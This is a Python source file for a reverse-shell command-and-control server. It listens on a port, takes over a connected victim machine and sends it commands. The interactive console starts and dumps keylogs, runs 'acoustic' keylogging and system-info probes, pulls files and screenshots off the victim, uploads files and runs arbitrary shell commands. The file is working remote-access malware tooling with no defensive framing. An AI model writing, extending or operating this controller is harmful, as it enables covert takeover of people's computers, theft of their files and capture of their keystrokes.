#!/usr/bin/env python3
import socket
import json
import base64
import argparse
import sys

count = 1
s = None
target = None
ip = None

def reliable_send(data):
    """Send data to client in JSON format with newline delimiter"""
    msg = json.dumps(data) + "\n"
    target.sendall(msg.encode("utf-8"))

def reliable_recv():
    """Receive data from client, framed by newline delimiter"""
    buf = b""
    while b"\n" not in buf:
        chunk = target.recv(4096)
        if not chunk:
            raise Exception("Connection closed by client")
        buf += chunk
    line, _, _ = buf.partition(b"\n")
    return json.loads(line.decode("utf-8"))

def shell():
    """Main shell loop - send commands and receive results"""
    global count
    print("\n" + "=" * 60)
    print(f"[*] Interactive Reverse Shell C2 Session Active")
    print(f"[*] Target Connected: {ip[0]}:{ip[1]}")
    print("[*] Type 'help' to see all commands including Ultrasonic C2")
    print("=" * 60 + "\n")
    
    while True:
        try:
            command = input(f"C2-Shell [{ip[0]}]#~ ").strip()
            if not command:
                continue

            reliable_send(command)

            if command == "q":
                print("[*] Terminating C2 session.")
                break

            elif command.startswith("cd "):
                print(reliable_recv())

            elif command.startswith("acoustic_emit "):
                print(reliable_recv())

            elif command in ("acoustic_keylog", "acoustic_sysinfo"):
                print(reliable_recv())

            elif command in ("keylog_start", "keylog_dump"):
                print(reliable_recv())

            elif command.startswith("download "):
                file_path = command[9:].strip()
                result = reliable_recv()
                if isinstance(result, str) and not result.startswith("[!!]"):
                    try:
                        with open(file_path, "wb") as file:
                            file.write(base64.b64decode(result.encode("ascii")))
                        print(f"[+] File downloaded successfully: {file_path}")
                    except Exception as e:
                        print(f"[!!] Failed to save file: {str(e)}")
                else:
                    print(result)

            elif command.startswith("upload "):
                try:
                    file_path = command[7:].strip()
                    with open(file_path, "rb") as fin:
                        file_data = base64.b64encode(fin.read()).decode("ascii")
                        reliable_send(file_data)
                    print(reliable_recv())
                except Exception as e:
                    print(f"[!!] Failed to upload file: {str(e)}")

            elif command.startswith("screenshot"):
                result = reliable_recv()
                if isinstance(result, str) and not result.startswith("[!!]"):
                    try:
                        screenshot_filename = f"screenshot_{count}.png"
                        with open(screenshot_filename, "wb") as screen:
                            screen.write(base64.b64decode(result.encode("ascii")))
                        print(f"[+] Screenshot saved as {screenshot_filename}")
                        count += 1
                    except Exception as e:
                        print(f"[!!] Failed to save screenshot: {str(e)}")
                else:
                    print(result)

            else:
                print(reliable_recv())

        except KeyboardInterrupt:
            print("\n[!] Ctrl+C pressed. Exiting C2 shell...")
            try:
                reliable_send("q")
            except Exception:
                pass
            break
        except Exception as e:
            print(f"[!!] Connection lost / Error: {str(e)}")
            break

def server(bind_ip="0.0.0.0", port=54321):
    """Set up server and wait for client connection"""
    global s, ip, target
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((bind_ip, port))
    s.listen(5)
    print(f"[+] Listening for Incoming C2 Connections on {bind_ip}:{port} ...")
    try:
        target, ip = s.accept()
        print(f"[+] SUCCESS: Target Connected from {ip[0]}:{ip[1]}!")
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
        sys.exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Reverse Shell C2 Server Listener")
    parser.add_argument("--bind", default="0.0.0.0", help="IP address to bind on (default: 0.0.0.0)")
    parser.add_argument("--port", type=int, default=54321, help="Port to listen on (default: 54321)")
    args = parser.parse_args()

    try:
        server(bind_ip=args.bind, port=args.port)
        shell()
    finally:
        if s:
            s.close()

